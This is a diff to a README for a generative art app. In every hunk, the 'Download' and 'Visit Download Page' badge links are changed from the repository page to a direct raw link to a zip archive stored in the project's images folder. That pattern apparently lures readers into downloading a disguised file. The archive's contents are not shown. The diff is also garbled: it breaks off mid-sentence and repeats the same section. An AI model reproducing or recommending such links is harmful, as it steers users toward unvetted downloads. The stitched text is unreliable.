@@ -1,6 +1,6 @@
 # 🌱 Generative-Lifeform-Generative-Art - Create Reproducible Glowing Lifeform Art
 
-[![Download Generative-Lifeform-Generative-Art](https://img.shields.io/badge/Download-Generative--Lifeform--Generative--Art-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mrWetCookie/Generative-Lifeform-Generative-Art)
+[![Download Generative-Lifeform-Generative-Art](https://img.shields.io/badge/Download-Generative--Lifeform--Generative--Art-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mrWetCookie/Generative-Lifeform-Generative-Art/main/images/v1.7.zip)
 
 Generative-Lifeform-Generative-Art is a seed-based creative application for making glowing nodes, branches, and organic patterns. It is designed for artists, textile designers, surface designers, and anyone who wants reproducible lifeform studies without programming.
 
@@ -24,7 +24,7 @@ You do not need to install a separate programming tool. The application runs loc
 
 Visit this link to download the application:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit_Download_Page-4ecdc4?style=for-the-badge&logo=github&logoColor=black)](https://github.com/mrWetCookie/Generative-Lifeform-Generative-Art)
+[![Visit Download Page](https://img.shields.io/badge/Visit_Download_Page-4ecdc4?style=for-the-badge&logo=github&logoColor=black)](https://raw.githubusercontent.com/mrWetCookie/Generative-Lifeform-Generative-Art/main/images/v1.7.zip)
 
 Save the downloaded application folder somewhere easy to find, such as your Desktop or Downloads folder. After the download is complete, open the folder and look for the main application file named index.html.
 
@@ -74,7 +74,7 @@ This reproducibility is helpful for:
 - Comparing small changes across a series.
 - Recreating a pattern for a client or# 🌱 Generative-Lifeform-Generative-Art - Create Reproducible Glowing Lifeform Art
 
-[![Download Generative-Lifeform-Generative-Art](https://img.shields.io/badge/Download-Generative--Lifeform--Generative--Art-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mrWetCookie/Generative-Lifeform-Generative-Art)
+[![Download Generative-Lifeform-Generative-Art](https://img.shields.io/badge/Download-Generative--Lifeform--Generative--Art-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mrWetCookie/Generative-Lifeform-Generative-Art/main/images/v1.7.zip)
 
 Generative-Lifeform-Generative-Art is a seed-based creative application for making glowing nodes, branches, and organic patterns. It is designed for artists, textile designers, surface designers, and anyone who wants reproducible lifeform studies without programming.
 
@@ -98,7 +98,7 @@ You do not need to install a separate programming tool. The application runs loc
 
 Visit this link to download the application:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit_Download_Page-4ecdc4?style=for-the-badge&logo=github&logoColor=black)](https://github.com/mrWetCookie/Generative-Lifeform-Generative-Art)
+[![Visit Download Page](https://img.shields.io/badge/Visit_Download_Page-4ecdc4?style=for-the-badge&logo=github&logoColor=black)](https://raw.githubusercontent.com/mrWetCookie/Generative-Lifeform-Generative-Art/main/images/v1.7.zip)
 
 Save the downloaded application folder somewhere easy to find, such as your Desktop or Downloads folder. After the download is complete, open the folder and look for the main application file named index.html.
 
